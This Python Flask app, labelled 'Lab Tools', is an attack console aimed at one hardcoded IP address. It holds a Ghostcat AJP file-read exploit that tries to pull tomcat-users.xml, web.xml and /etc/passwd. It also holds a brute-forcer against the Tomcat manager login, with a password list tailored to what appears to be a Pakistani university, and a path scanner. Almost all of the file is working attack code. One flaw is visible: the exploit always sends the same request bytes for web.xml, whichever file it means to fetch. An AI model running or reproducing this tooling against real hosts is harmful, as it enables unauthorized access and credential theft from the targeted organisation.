import socket
from flask import Flask

app = Flask(__name__)

def ghostcat(host, port=8009):
    results = []
    files = [
        "/WEB-INF/web.xml",
        "/WEB-INF/tomcat-users.xml",
        "/etc/passwd",
        "/WEB-INF/conf/opencms.properties"
    ]
    
    for f in files:
        try:
            s = socket.socket()
            s.settimeout(20)
            s.connect((host, port))
            
            payload = bytearray([
                0x12, 0x34, 0x00, 0x1f,
                0x02, 0x02,
                0x00, 0x08,
                0x48, 0x54, 0x54, 0x50,
                0x2f, 0x31, 0x2e, 0x31,
                0x00, 0x00, 0x1b,
                0x2f, 0x57, 0x45, 0x42,
                0x2d, 0x49, 0x4e, 0x46,
                0x2f, 0x77, 0x65, 0x62,
                0x2e, 0x78, 0x6d, 0x6c,
                0x00, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff,
                0x1f, 0x90, 0x00,
                0x00, 0x00, 0xff
            ])
            
            s.send(bytes(payload))
            
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except:
                pass
            
            if response:
                results.append({
                    "file": f,
                    "status": "SUCCESS",
                    "data": response.decode(errors='ignore')
                })
            else:
                results.append({
                    "file": f,
                    "status": "NO RESPONSE",
                    "data": ""
                })
            s.close()
            
        except Exception as e:
            results.append({
                "file": f,
                "status": "ERROR",
                "data": str(e)
            })
    
    return results

def bruteforce():
    target = "http://111.68.102.6:8080/manager/html"
    import urllib.request
    import base64
    
    users = ["tomcat","admin","manager","root"]
    passwords = [
        "tomcat","admin","admin123","password",
        "s3cret","manager","root","uet","uet123",
        "rcet","rcet123","lahore","pakistan",
        "123456","tomcat123","Admin123","changeme",
        "welcome","letmein","default","catalina",
        "java123","tomcat9","engineering","uet2024"
    ]
    
    results = []
    for user in users:
        for passwd in passwords:
            creds = f"{user}:{passwd}"
            b64 = base64.b64encode(creds.encode()).decode()
            req = urllib.request.Request(target)
            req.add_header("Authorization", f"Basic {b64}")
            req.add_header("User-Agent", "Mozilla/5.0")
            try:
                res = urllib.request.urlopen(req, timeout=5)
                if res.status == 200:
                    return f"FOUND: {user}:{passwd}"
            except urllib.error.HTTPError as e:
                if e.code == 401:
                    results.append(f"Failed: {user}:{passwd}")
            except Exception as e:
                results.append(f"Error: {str(e)[:30]}")
    
    return "No credentials found"

@app.route('/')
def index():
    return """
    <h1>Lab Tools</h1>
    <ul>
        <li><a href='/ghostcat'>Run Ghostcat</a></li>
        <li><a href='/brute'>Run Bruteforce</a></li>
        <li><a href='/info'>Server Info</a></li>
    </ul>
    """

@app.route('/ghostcat')
def run_ghostcat():
    results = ghostcat("111.68.102.6")
    output = "<h1>Ghostcat Results - 111.68.102.6:8009</h1>"
    for r in results:
        color = "green" if r['status'] == "SUCCESS" else "red"
        output += f"""
        <hr>
        <h3>File: {r['file']}</h3>
        <p style='color:{color}'>Status: {r['status']}</p>
        <pre style='background:#000;color:#0f0;padding:10px'>
{r['data'] if r['data'] else 'Empty response'}
        </pre>
        """
    return output

@app.route('/brute')
def run_brute():
    result = bruteforce()
    color = "green" if "FOUND" in result else "red"
    return f"""
    <h1>Bruteforce Results</h1>
    <p style='color:{color};font-size:24px'>{result}</p>
    """

@app.route('/info')
def server_info():
    import urllib.request
    import urllib.error
    
    target = "http://111.68.102.6:8080"
    paths = [
        "/", "/home", "/opencms/",
        "/examples/", "/docs/",
        "/manager/html", "/host-manager/html",
        "/examples/jsp/snp/snoop.jsp",
    ]
    
    output = "<h1>Server Map - 111.68.102.6:8080</h1>"
    output += "<table border='1' cellpadding='10'>"
    output += "<tr><th>Status</th><th>Path</th></tr>"
    
    for path in paths:
        try:
            req = urllib.request.Request(
                target + path,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            res = urllib.request.urlopen(req, timeout=5)
            output += f"<tr style='background:green;color:white'><td>{res.status} OPEN</td><td>{path}</td></tr>"
        except urllib.error.HTTPError as e:
            output += f"<tr style='background:orange'><td>{e.code} FOUND</td><td>{path}</td></tr>"
        except Exception as e:
            output += f"<tr style='background:red;color:white'><td>ERROR</td><td>{path}</td></tr>"
    
    output += "</table>"
    return output

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
